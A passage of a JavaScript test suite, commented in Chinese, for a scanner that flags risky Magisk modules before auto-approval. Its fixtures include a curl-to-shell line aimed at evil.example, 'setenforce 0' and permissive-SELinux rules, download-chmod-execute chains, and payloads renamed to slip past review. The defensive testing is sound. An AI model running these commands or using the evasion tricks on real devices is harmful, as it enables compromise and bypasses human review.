    `第 3、4 行是 rm 的参数表（不许报），第 5 行是攻击者挑的形状（必须报）：${JSON.stringify(eb.map((f) => `${f.line}:${f.snippet}`))}`);
  assert.equal(eb[0].severity, 'high', `第 5 行在跑随包提交的文件：${JSON.stringify(eb[0])}`);
  // 豁免只作用于「报不报」：被引用的条目照样被读掉。
  // Task 2.7（fix10-P11）：system/placeholder 是可读文本、本来就在 feed 上 → 没有升级证人，
  // 但「扫描面不许因为这条豁免而缩小」由它在被逐行扫过的清单里这一句钉住。
  assert.ok(r.scripts.some((s) => s.name === 'system/placeholder'),
    `扫描面不许因为这条豁免而缩小：${JSON.stringify(r.scripts.map((s) => s.name))}`);
  assert.deepEqual(r.escalated, [],
    'system/placeholder 已在 feed 上：escalated 只记「原本不在扫描面」的条目，不许为它作伪证');
  assert.ok(r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'system/placeholder'),
    `被引用的载荷必须真的被读过：${JSON.stringify(r.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`))}`);
  assert.equal(r.riskLevel, 'high', '整包定级不因为这 FP 撤掉而变松');
});

test('fix6-F1：豁免不许把「上一行的动词」当成免检通行证传给整条逻辑行 —— 逻辑行内部仍是逐行判', () => {
  // rm -rf \ 之后跟的第一行确实是参数位；但同一文件里另一条以清单形状开头、前面没有续行
  // 关系的行，必须重新按命令位判。这条与上面那条端到端用例是同一条主张的两种粒度。
  const t = [
    'rm -rf \\',
    FIX6_LIST_A,
    FIX6_LIST_B,
    'ui_print "- done"',
    '$MODPATH/payload $MODPATH/x \\',
  ].join('\n') + '\n';
  const h = assertHit('EXEC_BUNDLED_FILE', t, '第 5 行前面是 ui_print，不是续行');
  assert.deepEqual(h.map((f) => f.line), [5], JSON.stringify(h.map((f) => `${f.line}:${f.snippet}`)));
});

// ===========================================================================
// 第七轮（Task 2.6）—— P15：`SELINUX_TYPE_PERMISSIVE` 的散文分支 / P11：名单外可读文本进扫描面
// ===========================================================================
//
// 两条都是实测出来的，不是推出来的（Temp 快照三方对照，见 §0.11 与本任务报告）：
//   P15 —— PerformanC/ReZygisk 的 `webroot/LICENSE:189`
//          `-permissive terms added in accord with section 7 apply to the code;`
//          被判成 SELINUX_TYPE_PERMISSIVE/high。GPL 许可证散文里「permissive … ;」读成策略语句的
//          唯一原因是分支二尾部那个 `(?:\s+[A-Za-z0-9_.\-:]+)*` ——「permissive 后面可以跟任意多个
//          空格分隔的词，只要整段以 ; 收尾」。SELinux 的一条语句不会含空格隔开的散文，所以删掉它，
//          不加分支、不加谓词（加一条豁免就少一条能咬人的形状）。
//          分支一（`^\s*(?:type)?permissive …`，本来就不要求 `;`）一个字没动 ⇒ 行首多类型写法仍由它接住。
//   P11 —— 「把 `cls.others` 也接进扫描面」那一行（scan.mjs 的 `.concat(cls.others || [])`）本轮实测否决，
//          已回退：扩面之后 `sh $MODDIR/payload.dat` 那条 EXEC_BUNDLED_FILE/high 会被「目标已在扫描面
//          ⇒ 引用不需要单独发现」的撤销判据撤掉，整包从 high/block 掉到 low/auto-approve。
//          P15 单独上今天什么都不改变（`LICENSE` 不在扫描面里），所以本轮只落 P15。
//          —— 以上是第 7 轮的记录，原文照留。Task 2.7（fix10-P11）按它当时的结论把「撤销判据」拆出来
//          之后重做了扩面：feed（谁被扫）与 covered（能不能撤）不再是同一个集合，那一行现在在
//          `scan.mjs` 里，下面那颗反撤销钉跟着改成钉新的真话。
//
// 已知限度（如实钉在下面第 3 条里，不当成已解决）：行中且一行多类型不带花括号
// （`x=1; permissive su_t magisk_t;`）本轮起不再命中；`/* permissive layout; */` 这种
// 「一个词 + 分号」的 CSS/JS 注释仍然命中。逐条见任务报告「残余限度」。

const hitsP15 = (id, file, line) => RULES_BY_ID[id].scan(file, line);

test('P15：许可证散文里的 "permissive … ;" 不算 SELinux 语句（实测曾送出一条 high）', () => {
  for (const [file, line] of [
    ['webroot/LICENSE', '-permissive terms added in accord with section 7 apply to the code;'],
    ['webroot/LICENSE', 'and permissive terms applies to the work;'],
    ['config.toml', 'description = "redistributable under terms; permissive licensing applies;"'],
  ]) {
    assert.equal(hitsP15('SELINUX_TYPE_PERMISSIVE', file, line).length, 0, `许可证/配置散文不该命中：${line}`);
  }
});

test('P15：策略语句的形状一个都不许放过（含 P7 decoy 与 P14 锚点闭包两类写法）', () => {
  for (const [file, line] of [
    ['sepolicy.rule', 'permissive su_t;'],
    ['sepolicy.rule', 'typepermissive su;'],
    ['sepolicy.rule', 'permissive magisk;'],
    ['sepolicy.rule', 'permissive { su magisk };'],
    ['sepolicy.rule', 'typepermissive untrusted_app;'],
    ['sepolicy.rule', 'permissive su_t magisk_t;'],           // 行首那支不要求 ;
    ['service.sh', 'x=1; typepermissive su;'],
    ['service.sh', 'echo "本模块不 typepermissive su;"; typepermissive su;'],
    ['service.sh', 'MODDIR=${0%/*}; typepermissive su;'],
    ['service.sh', 'typepermissive su; # 行尾说明'],
  ]) {
    const h = hitsP15('SELINUX_TYPE_PERMISSIVE', file, line);
    assert.equal(h.length, 1, `必须恰好一条：${file} << ${line}`);
    assert.equal(h[0].severity, 'high', `permissive 仍然是 high：${line}`);
  }
});

test('P15 已知限度（如实钉住，不许日后当「顺手简化」把它放回去）：行中且一行多类型不带花括号', () => {
  assert.equal(hitsP15('SELINUX_TYPE_PERMISSIVE', 'service.sh', 'x=1; permissive su_t magisk_t;').length, 0,
    '打桩前 1 条、打桩后 0 条：这是本轮唯一一处「认得出的合法写法变严不起来」的地方');
  assert.equal(hitsP15('MAGISK_POLICY_LIVE', 'service.sh', 'magiskpolicy --live "permissive su"').length, 1,
    'permissive 走命令行那条路必须有另一条规则说话 —— 这条线不是裸奔');
});

// ---------------------------------------------------------------------------
// 反 P11 撤销钉：扩扫描面不许把「目标已在扫描面 ⇒ 这条引用不需要单独发现」变成全哑
// ---------------------------------------------------------------------------
// 扩扫描面必须同时收缩 covered 集 —— 见 Task 2.7（扩扫描面必须带 covered 集收缩）。
// Task 2.7（fix10-P11）落地后，这颗钉子跟着改成钉新的真话，两件东西不许跟着松：
// (a) `others` 现在**在**扫描面上（BASE 实测：那一格 0 条发现 / low / auto-approve，本轮闭掉）；
// (b) 载荷名字像数据、内容无规则命中时，那条 EXEC_BUNDLED_FILE/high 仍然不许被撤销 ——
//     证人是 finding 自己（载荷已在 feed 上，所以 escalated 为空是正确结果，不是证人丢了）。

test('反 P11 撤销钉：名单外文本已被扩面读掉，且读掉它撤销不掉 EXEC_BUNDLED_FILE/high', () => {
  // (a) 现在的真行为：`stage.dat` 里那行 `setenforce 0` 被逐行扫过了 —— Task 2.7 补的就是这一格。
  //     BASE（`75b76ca`）实测：这个包 0 条发现 / low / auto-approve（引用方与载荷都不像脚本，谁也没读过）。
  const silent = scanZip(makeModuleZip({
    id: 'eval.p11silent',
    files: [
      ['module.prop', moduleProp('eval.p11silent')],
      ['service.sh', '#!/system/bin/sh\necho ready\n'],
      ['stage.dat', 'setenforce 0\n'],
    ],
  }), {});
  assert.ok(silent.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'stage.dat'
    && f.severity === 'high'),
    'stage.dat 现在在扫描面上，`setenforce 0` 必须被逐行读出来（Task 2.7 已闭，不是待补的洞）：'
    + JSON.stringify(silent.findings.map((f) => `${f.ruleId}/${f.severity}@${f.file}:${f.line}`)));
  assert.ok(silent.scripts.some((s) => s.name === 'stage.dat'),
    '它必须在被逐行扫过的文件里：' + JSON.stringify(silent.scripts.map((s) => s.name)));
  assert.equal(silent.riskLevel, 'high', '名单外文本里的载荷不能再安静地留在 low');

  // (b) 要保护的性质：payload.dat 内容无规则命中，整包唯一的发现就是那条引用 —— 撤销它就是整包哑掉。
  const pin = scanZip(makeModuleZip({
    id: 'eval.p11pin',
    files: [
      ['module.prop', moduleProp('eval.p11pin')],
      ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.dat\n'],
      ['payload.dat', 'LABEL_ALPHA\nLABEL_BETA\nLABEL_GAMMA\n'],
    ],
  }), { changeType: 'first' });
  const exec = pin.findings.filter((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.equal(exec.length, 1, JSON.stringify(pin.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`)));
  assert.equal(exec[0].severity, 'high', '执行一个名字像数据的包内条目必须是 high');
  assert.deepEqual([exec[0].file, exec[0].line], ['service.sh', 2], JSON.stringify(exec[0]));
  assert.equal(pin.findings.length, 1, 'payload.dat 无规则命中：这条引用就是整包唯一的发现');
  // 证人换了落点，不是丢了：载荷已经在 feed 上被逐行读过，所以
  //   * escalated 必须是空 —— escalated 只记「原本不在扫描面、因引用被拉进来的条目」，
  //     为已在面上的条目记一笔就是假账；
  //   * revokedBundledRefs 也必须是空 —— covered 判在扩面之前的五个桶上，这条撤销没有发生，
  //     没发生过的事不许写进撤销记录。
  assert.ok(pin.scripts.some((s) => s.name === 'payload.dat'),
    '载荷必须真被逐行读过（这才是「读过」的证据）：' + JSON.stringify(pin.scripts.map((s) => s.name)));
  assert.deepEqual(pin.escalated, [],
    'payload.dat 本来就在 feed 上：没有升级证人，是记法变了，不是证人没了');
  assert.deepEqual(pin.revokedBundledRefs, [],
    '撤销没有发生：记录里一笔都不许有（有就等于把「读过即无罪」又写回扫描面）');
  assert.notEqual(pin.decision.action, 'auto-approve',
    '首次收录正是「撤销一旦成立就放行」落到的那一档 —— 这条线不许被任何扫描面改动推开');
});

// ---------------------------------------------------------------------------
// Task 2.8（fix8-E）：撤销过就不许走自动通道
// ---------------------------------------------------------------------------
// 洞（§0.13）：applyBundledRefVerdicts() 的 covered 撤销把「扫过且行级规则没命中」当成
// 「读过并且无罪」，而**被执行文件的名字由投稿者挑** —— 改名成 .js/.sh/.lua 就落在扫描面上，
// 撤销成立，首次收录直接 auto-approve；改名成 .dat 才是 high/block。
// 用户拍的是 E 不是 A：撤销照旧（等级、findings 内容、评论噪声一字不动），
// 但每次撤销都要在报告专用字段里留下记录，且发生过撤销的包不许走自动通道 ——
// 代价落在决策上，不落在散文里。
// 硬边界：本任务只把 auto-approve 翻成 request-review；medium/high 的路径一字不改，
// 所以不可能让任何包变得比改动前更容易自动放行。

const E8_PAYLOAD_TEXT = 'just a string table, nothing to run\n';

/** 同一个包，只换被执行条目的名字：这样「名字决定结论」这件事在测试里是可复现的，不是叙述。 */
function e8Zip(id, name, refLine) {
  return makeModuleZip({
    id,
    files: [
      ['module.prop', moduleProp(id)],
      ['service.sh', `#!/system/bin/sh\n${refLine}\n`],
      [name, E8_PAYLOAD_TEXT],
    ],
  });
}

test('fix8-E：载荷改名成 .js/.sh/.lua 骗到撤销后，等级不动但不许再走自动通道（同一个洞的三个名字）', () => {
  for (const name of ['payload.js', 'payload.sh', 'payload.lua']) {
    const r = scanZip(e8Zip('eval.e8disguise', name, `sh $MODDIR/${name}`), { index: [] });
    // 撤销仍然撤销：E 不新增发现、不抬等级、不往 findings[] 里塞 info。
    assert.equal(r.riskLevel, 'low', `${name}：E 不动等级`);
    assert.equal(r.findings.length, 0, `${name}：那条 finding 仍然被撤销，不回到 findings[]`);
    assert.equal(r.counts.info, 0, `${name}：撤销记录不是 findings 里的 info（renderJSON 会连带脱敏）`);
    assert.equal(r.escalated.length, 0, `${name}：本来就在扫描面上，没有升级证人`);
    // 唯一的行为变化：自动通道关上，且只朝更严的方向翻。
    // 这条放在记录断言之前 —— 改前的红应当直接写成 auto-approve ≠ request-review（那个洞本身），
    // 而不是「字段不存在」的 TypeError。
    assert.equal(r.decision.action, 'request-review', `${name}：撤销过就不许自动放行`);
    assert.equal(r.decision.label, 'needs-human-review', name);
    assert.equal(r.decision.needsHumanReview, true, name);
    assert.ok(r.decision.reason.includes(name),
      `${name}：reason 必须指名被撤销的条目，人看得见是哪个文件`);
    // 但撤销不再静默：专用字段里要有指名条目的一笔记录。
    assert.equal(r.revokedBundledRefs.length, 1, `${name}：撤销过一次就要记一笔`);
    const rec = r.revokedBundledRefs[0];
    assert.equal(rec.ruleId, 'EXEC_BUNDLED_FILE', name);
    assert.deepEqual([rec.file, rec.line], ['service.sh', 2], name);
    assert.equal(rec.ref, `sh $MODDIR/${name}`, name);
    assert.equal(rec.resolvedEntry, name, `${name}：记录要写被撤销的那个条目路径`);
    assert.equal(rec.covered, true, name);
    // §2.7 文案纪律：说的是机器不作证，不是把投稿人写成嫌犯。
    for (const w of ['可疑', '恶意', '攻击', '违法', '嫌犯', '绕过']) {
      assert.ok(!r.decision.reason.includes(w), `${name}：reason 不许出现「${w}」—— ${r.decision.reason}`);
    }
  }
});

test('fix8-E 反证：payload.dat 那一格撤销并未发生，记录里不能凭空多出一笔', () => {
  const r = scanZip(e8Zip('eval.e8dat', 'payload.dat', 'sh $MODDIR/payload.dat'), { index: [] });
  const exec = r.findings.filter((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.equal(exec.length, 1, JSON.stringify(r.findings.map((f) => `${f.ruleId}/${f.severity}`)));
  assert.equal(exec[0].severity, 'high', '这条仍是 high —— E 不靠改等级闭洞');
  assert.equal(r.riskLevel, 'high', JSON.stringify(r.counts));
  assert.equal(r.decision.action, 'block');
  // Task 2.7（fix10-P11）换了这里 instrument 的对象，主张一字没动：
  // 「撤销没有发生 ⇒ 记录里不许有一笔」。发生过的读取代价现在落在 feed 上（载荷被逐行扫过），
  // 而不是落在 escalated 上 —— 后者只记「原本不在扫描面、因引用被拉进来的条目」，
  // 给已经在面上的条目记一笔就是假账。所以两条都必须是空，且都要被钉住。
  assert.deepEqual(r.escalated, [],
    'payload.dat 本来就在 feed 上：没有升级可记。证人换成下面两条 —— 它真被读了，且那条 high 还在');
  assert.ok(r.scripts.some((s) => s.name === 'payload.dat'),
    '载荷必须被逐行扫过（这才是「读过」的证据）：' + JSON.stringify(r.scripts.map((s) => s.name)));
  assert.equal(r.revokedBundledRefs.length, 0,
    '没撤销过的事不许写进撤销记录 —— 反证：记录必须只说发生过的事');
});

test('fix8-E 单元：decide 第三参可选、默认 null；medium/high 与 update/unknown 一字不改（硬边界）', () => {
  const revoked = { revokedCount: 1, revokedEntries: ['payload.js'] };
  assert.equal(decide('low', 'first').action, 'auto-approve', '两参调用保持原样');
  assert.equal(decide('low', 'first', null).action, 'auto-approve', '显式传 null 也照旧');
  assert.equal(decide('low', 'first', { revokedCount: 0, revokedEntries: [] }).action, 'auto-approve',
    '没发生过撤销就照旧放行');
  const d = decide('low', 'first', revoked);
  assert.equal(d.action, 'request-review');
  assert.equal(d.label, 'needs-human-review');
  assert.equal(d.needsHumanReview, true);
  assert.ok(d.reason.includes('payload.js'), JSON.stringify(d));
  // 其余分支必须逐字段不动：撤销记录不给 medium/high 加任何新措辞。
  assert.deepEqual(decide('low', 'update', { revokedCount: 3, revokedEntries: ['a.js', 'b.js'] }),
    decide('low', 'update'), 'update 路径不受影响');
  assert.deepEqual(decide('low', 'unknown', { revokedCount: 3, revokedEntries: ['a.js'] }),
    decide('low', 'unknown'), 'unknown 路径不受影响');
  for (const lv of ['medium', 'high']) {
    for (const ct of ['first', 'update', 'unknown']) {
      assert.deepEqual(decide(lv, ct, { revokedCount: 5, revokedEntries: ['x.js'] }), decide(lv, ct),
        `${lv}/${ct} 带着撤销记录也必须一字不改（它本来就 block）`);
    }
  }
});

test('fix8-E：撤销记录写包内真实条目名，引用里的大小写拼法留在 ref 上；多条撤销逐条记账', () => {
  // 大小写变体：引用写 PAYLOAD.js，包内条目是 payload.js。报告要指认的是被读过的那个条目。
  const lo = scanZip(makeModuleZip({
    id: 'eval.e8case',
    files: [
      ['module.prop', moduleProp('eval.e8case')],
      ['service.sh', '#!/system/bin/sh\nsh $MODDIR/PAYLOAD.js\n'],
      ['payload.js', E8_PAYLOAD_TEXT],
    ],
  }), { index: [] });
  assert.equal(lo.revokedBundledRefs.length, 1, JSON.stringify(lo.revokedBundledRefs));
  assert.equal(lo.revokedBundledRefs[0].resolvedEntry, 'payload.js', '写真实条目名');
  assert.equal(lo.revokedBundledRefs[0].ref, 'sh $MODDIR/PAYLOAD.js', '引用原文照抄，供人工复验');
  assert.equal(lo.decision.action, 'request-review');
  assert.ok(lo.decision.reason.includes('payload.js'), lo.decision.reason);

  // 两条撤销：两个被执行条目各自记账，reason 把两个条目都点名。
  const two = scanZip(makeModuleZip({
    id: 'eval.e8two',
    files: [
      ['module.prop', moduleProp('eval.e8two')],
      ['service.sh', '#!/system/bin/sh\nsh $MODDIR/a.js\n. $MODDIR/b.sh\n'],
      ['a.js', E8_PAYLOAD_TEXT],
      ['b.sh', '#!/system/bin/sh\necho ok\n'],
    ],
  }), { index: [] });
  assert.equal(two.riskLevel, 'low', JSON.stringify(two.findings));
  assert.equal(two.revokedBundledRefs.length, 2, JSON.stringify(two.revokedBundledRefs));
  assert.deepEqual(two.revokedBundledRefs.map((x) => [x.file, x.line, x.resolvedEntry]),
    [['service.sh', 2, 'a.js'], ['service.sh', 3, 'b.sh']], JSON.stringify(two.revokedBundledRefs));
  assert.ok(two.decision.reason.includes('a.js') && two.decision.reason.includes('b.sh'),
    two.decision.reason);
});

test('fix8-E 代价一侧也钉住：标准写法被撤销同样记账转人工，纯包外引用不记撤销', () => {
  // 正经模块的 `sh $MODPATH/verify.sh` 是同一形状的撤销 —— E 承认识别的代价落在决策上，
  // 不写成罪名：首次收录的这一档从此进人工队列（这正是它换掉 A 的理由）。
  const legit = scanZip(makeModuleZip({
    id: 'eval.e8legit',
    files: [
      ['module.prop', moduleProp('eval.e8legit')],
      ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/verify.sh\n'],
      ['verify.sh', '#!/system/bin/sh\necho verified\n'],
    ],
  }), { index: [] });
  assert.equal(legit.riskLevel, 'low', JSON.stringify(legit.findings));
  assert.equal(legit.findings.length, 0, 'E 不给标准写法新增任何发现');
  assert.equal(legit.revokedBundledRefs.length, 1, JSON.stringify(legit.revokedBundledRefs));
  assert.equal(legit.revokedBundledRefs[0].resolvedEntry, 'verify.sh');
  assert.equal(legit.decision.action, 'request-review');
  assert.ok(!/可疑|恶意|绕过|嫌犯/.test(legit.decision.reason), legit.decision.reason);

  // 撤销的另一半：引用指向包外程序时，机器没有替任何**包内条目**作过证，不该记这一笔。
  const external = scanZip(makeModuleZip({
    id: 'eval.e8ext',
    files: [
      ['module.prop', moduleProp('eval.e8ext')],
      ['service.sh', '#!/system/bin/sh\nS="/system/bin/sh"\nsh $S /dev/null\n'],
    ],
  }), { index: [] });
  assert.equal(external.findings.length, 0, JSON.stringify(external.findings));
  assert.equal(external.revokedBundledRefs.length, 0,
    '包外目标不是「被撤销的包内条目」，记进那一栏会让报告说假话');
  assert.equal(external.decision.action, 'auto-approve',
    '没有包内撤销时，自动通道保持今天的样子（E 只关撤销那一格）');
});

test('fix8-E：EXEC_INDIRECT 的撤销在同一条 net 里（变量钉成包内 .js 也要记账、也转人工）', () => {
  // 两条入口共用同一个撤销分支：EXEC_BUNDLED_FILE（字面路径）与 EXEC_INDIRECT（变量间接）。
  // 这条不是推演 —— 若只有字面路径被记，改名 + 变量包装就还留着一条静默通路。
  const r = scanZip(makeModuleZip({
    id: 'eval.e8indirect',
    files: [
      ['module.prop', moduleProp('eval.e8indirect')],
      ['service.sh', '#!/system/bin/sh\nPL="$MODDIR/payload.js"\nsh $PL\n'],
      ['payload.js', E8_PAYLOAD_TEXT],
    ],
  }), { index: [] });
  assert.equal(r.riskLevel, 'low', JSON.stringify(r.findings));
  assert.equal(r.findings.length, 0, '撤销照旧');
  assert.equal(r.revokedBundledRefs.length, 1, JSON.stringify(r.revokedBundledRefs));
  assert.equal(r.revokedBundledRefs[0].ruleId, 'EXEC_INDIRECT', JSON.stringify(r.revokedBundledRefs[0]));
  assert.equal(r.revokedBundledRefs[0].resolvedEntry, 'payload.js');
  assert.equal(r.decision.action, 'request-review');
  assert.ok(r.decision.reason.includes('payload.js'), r.decision.reason);
});

// ---------------------------------------------------------------------------
// Task 2.7（fix10-P11）探针：三个集合不许写成同一个
// ---------------------------------------------------------------------------
// 洞（2026-10-14 在 BASE `75b76ca` 上重新实测，母本同形状）：
// 引用方（config.json）与被引用的载荷（payload.dat）**都不像脚本**时，两者都落在
// SCAN_TARGET_BUCKETS 之外 —— 于是「引用扫描」看不见这条引用，内容扫描也没读过那个载荷，
// 整包 0 发现 / low / auto-approve：这条闸对投稿者自己挑的两个名字同时静默。
//
// 闭法是把一个集合拆成三个（判据 2 与 3 混用的后果 = 同一条 finding 出现两次，
// 它会直接写进公开评论的「命中统计」）：
//   1. feed（内容扫谁）   = 五个桶 ∪ cls.others ∪ 升级条目；
//   2. covered（能撤吗）  = **只有五个桶**（扩面之前）；
//   3. 去重（别推第二遍） = 跟着 feed，不跟着 covered。
// 三条断言一条不多 —— 它们各自钉住上面三行里的一行。
test('Task 2.7 探针：引用方与载荷都在名单外的包，不许走自动通道、证人要在、finding 不许重复', () => {
  const r = scanZip(makeModuleZip({
    id: 'eval.p10probe2',
    files: [
      ['module.prop', moduleProp('eval.p10probe2')],
      ['config.json', '{ "hook": "sh $MODDIR/payload.dat" }\n'],
      ['payload.dat', '#!/system/bin/sh\ncurl http://evil.example/x | sh\n'],
    ],
  }), { changeType: 'first', index: { modules: [] } });
  const keys = r.findings.map((x) => `${x.ruleId}@${x.file}:${x.line}`);
  assert.notEqual(r.decision.action, 'auto-approve', '引用方与载荷都不像脚本的包，不许走自动通道');
  assert.ok(keys.includes('EXEC_BUNDLED_FILE@config.json:1'), '证人必须指名是哪个文件在调用它');
  assert.equal(new Set(keys).size, keys.length, '同一条 finding 不许出现两次（feed 与 covered 混用的后果）');
});

// ===========================================================================
// Task 3 —— 两阶段「下载 → 落盘 → 执行」显式分档（DOWNLOAD_THEN_EXEC）
// ===========================================================================
// 洞（工单 §1，2026-10-14 主控在 0f4ddbe 实测，本会话不重新推演）：
//   curl <url> -o /data/local/tmp/u  ->  chmod 700 <同一路径>  ->  裸路径执行
//   整包 findings 只有 NETWORK_FETCH/low ⇒ low + 首次收录 = **auto-approve**。
// 管道写法（`curl … | sh`）一直由 PIPE_TO_SHELL 咬住 high/block，落盘写法没人说话 ——
// 这条规则闭的就是那一格，而不是新增一档：high/block 与既有管道写法同档。
//
// 断言口径（工单 §3 的要求，不是建议）：每一条夹具都 deepEqual 到**精确的 findings 多重集合**，
// 不写 some(...) 那种存在性断言 —— 存在性断言摘掉一条邻居规则照样绿，而这一节要的是
// 「将来谁把哪一条摘掉/放宽，都在这里当场变红」。反面（不该咬的）同样钉精确集合，
// 因为「0 命中」必须由整包集合一起说话，否则邻居规则新增的 low 也会被读成「什么都没报」。
const T3_SHEBANG = '#!/system/bin/sh';

/** T3 夹具统一的取数口径：一个 service.sh（module.prop 由夹具自动补齐），首次收录。 */
function t3scan(id, body) {
  return scanToReport(makeModuleZip({ id, files: [['service.sh', body]] }), { changeType: 'first' });
}
/** 整份报告的 findings 收成可 deepEqual 的「ruleId/severity」多重集合（排序）。 */
function t3set(r) {
  return r.findings.map((f) => `${f.ruleId}/${f.severity}`).sort();
}
/** 某一条规则在报告里的落点（文件:行/级别），同样排序后可 deepEqual。 */
function t3spots(r, ruleId) {
  return r.findings.filter((f) => f.ruleId === ruleId)
    .map((f) => `${f.file}:${f.line}/${f.severity}`).sort();
}
/** 单条规则在文本层的命中落点（行/级别）。跨行规则的夹具在 scanContent 之下也要钉得住。 */
function t3hits(text, file = 'service.sh') {
  return hits('DOWNLOAD_THEN_EXEC', text, file).map((f) => `${f.line}/${f.severity}`).sort();
}
const t3body = (...lines) => lines.join('\n') + '\n';

// —— 正面 1–6：必须出 1 条 DOWNLOAD_THEN_EXEC/high，且整包 high/block ——

test('T3.1 正面：curl -o 落盘 → chmod → 裸路径执行（工单 §1 那一格，普通域名，不靠域名抬级）', async () => {
  const r = await t3scan('eval.t3a', t3body(T3_SHEBANG,
    'curl https://dl.static-assets.dev/up -o /data/local/tmp/u',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u &'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'], '一条链只报一次，报在执行行上');
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low'], 'findings 集合逐条钉死');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3.2 正面：wget -P <目录> <url> → sh <目录 + URL basename>（计划没写到的 sink 是目录的形状）', async () => {
  const r = await t3scan('eval.t3b', t3body(T3_SHEBANG,
    'wget -q -P /data/local/tmp https://dl.static-assets.dev/payload',
    'sh /data/local/tmp/payload'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:3/high']);
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3.3 正面：curl -s <url> > <路径> → sh <路径>（重定向落盘也是 sink）', async () => {
  const r = await t3scan('eval.t3c', t3body(T3_SHEBANG,
    'curl -s https://dl.static-assets.dev/y > /data/local/tmp/y',
    'sh /data/local/tmp/y'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:3/high']);
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3.4 正面：NAME=绝对路径 → curl -o "$NAME" → 两侧分别用变量与字面量（替换必须是承重的）', async () => {
  // 工单 §3.4 的 `"$D"` 形态在最后一行；倒数第二行用**字面量**执行同一个路径。
  // 两行都留着是有意的：链只报一次，而报的是**最早**那一行 —— 摘掉变量替换时两侧键不再相等，
  // 只剩 `"$D"` ↔ `"$D"` 这条同名链，落点会从第 4 行漂到第 5 行（变异 (c) 就红在这儿）。
  const r = await t3scan('eval.t3d', t3body(T3_SHEBANG,
    'D=/data/local/tmp/p',
    'curl -s https://dl.static-assets.dev/p -o "$D"',
    'sh /data/local/tmp/p',
    '"$D"'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'],
    '两侧都换成字面值再比：sink 与两个执行形态是同一条链，报最早的执行行');
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3.5 正面：curl 的 -o 写在续行上也立得住 sink（命令位由逻辑行说话，见 buildLineContexts）', async () => {
  const r = await t3scan('eval.t3e', t3body(T3_SHEBANG,
    'curl \\',
    '-o /data/local/tmp/u \\',
    'https://dl.static-assets.dev/up',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:6/high'],
    '落地行是 -o 那一行（3），执行行 6 > 3 ⇒ 一条链');
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3.6 正面：同一 sink 上 chmod + 裸路径 + sh <路径> 三种形态都在 ⇒ 一条链只报一次', async () => {
  const r = await t3scan('eval.t3f', t3body(T3_SHEBANG,
    'curl -s https://dl.static-assets.dev/u -o /data/local/tmp/u',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u',
    'sh /data/local/tmp/u'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'],
    '三种执行形态是同一条链：取最早的执行行，只出 1 条');
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.counts.high, 1, '一条链不许把 high 计数抬成 2');
});

// —— 负面 7–13：必须**不出** DOWNLOAD_THEN_EXEC，且整包仍可 auto-approve ——

test('T3.7 负面：只下载不执行（存成数据/资源）保持 low / auto-approve —— 这一格不许被 T3 打进去', async () => {
  const r = await t3scan('eval.t3g', t3body(T3_SHEBANG,
    'curl -s https://x.dev/db.sqlite -o $MODPATH/db.sqlite'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '下载一个数据库文件不是执行链');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

test('T3.8 负面：路径只出现在参数位（ls -l / ui_print）不是执行形态', async () => {
  const r = await t3scan('eval.t3h', t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'ls -l /data/local/tmp/u',
    'ui_print "/data/local/tmp/u"'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '命令位是 ls / ui_print 时路径只是参数');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

test('T3.9 负面：只有 chmod（下载 + chmod，没有执行）不报 —— 已知限度，不许写成已覆盖', async () => {
  const r = await t3scan('eval.t3i', t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'chmod 700 /data/local/tmp/u'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [],
    'chmod 644 一个下载来的配置文件是合法形状：单独一条 chmod 不构成执行');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
